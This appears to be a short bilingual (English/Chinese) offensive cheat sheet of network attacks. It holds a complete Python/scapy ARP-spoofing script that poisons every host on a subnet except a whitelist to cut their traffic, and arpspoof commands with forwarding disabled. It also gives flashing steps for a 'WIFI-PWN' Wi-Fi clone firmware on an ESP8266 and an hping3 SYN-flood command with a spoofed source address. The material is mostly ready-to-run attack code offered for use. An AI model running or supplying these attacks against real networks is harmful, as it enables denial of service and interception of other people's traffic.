# Network Attacks

## Arp Spoofing

### Python Script

基于白名单列表进行 ARP IP 段流量阻断

```python
import scapy.all as scapy
import time

def scan_network(ip_range):
    arp_request = scapy.ARP(pdst=ip_range)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
    active_ips = []
    for element in answered_list:
        active_ips.append(element[1].psrc)
    return active_ips

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        return None

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if target_mac is not None:
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False)

# Replace these with the actual IP range and exclusion list
ip_range = "192.168.1.0/24"
gateway_ip = "192.168.1.1"
exclusion_list = ["192.168.1.1", "192.168.1.4", "192.168.1.6"]

try:
    active_ips = scan_network(ip_range)
    target_ips = [ip for ip in active_ips if ip not in exclusion_list]
    sent_packets_count = 0
    print(active_ips)
    while True:
        for target_ip in target_ips:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            sent_packets_count = sent_packets_count + 2
            print(f"\\r[*] Packets Sent to {target_ip} -> " + str(sent_packets_count), end="")
        time.sleep(1) # Waits for two seconds

except KeyboardInterrupt:
    print("\\nCtrl + C pressed.............Exiting")
    for target_ip in target_ips:
        restore(gateway_ip, target_ip)
        restore(target_ip, gateway_ip)
    print("[+] Arp Spoof Stopped")
```

### Quick spoofing on Linux

```bash
apt install dsniff
nmap -sP 192.168.86.1/26
sysctl -w net.ipv4.ip_forward=0
sudo arpspoof -i wlan0 -t 192.168.86.30 -r 192.168.86.1
```

## WIFI Clone

### ESP8266 MCU 烧录 WIFI-PWN

```bash
pip install esptool
esptool.py --port COM5 erase_flash
esptool.py --port COM5 --baud 115200 write_flash -fm dio -fs 32m 0x00000 NODEMCU.bin
```

## TCP SYN Flood

主要使用 HPING3 工具进行 DOS 攻击：伪造 IP、目标 IP

```bash
hping3 -c 5000 -d 1024 -S -w 64 -p 21 --flood -a 192.168.10.254 192.168.10.120
```
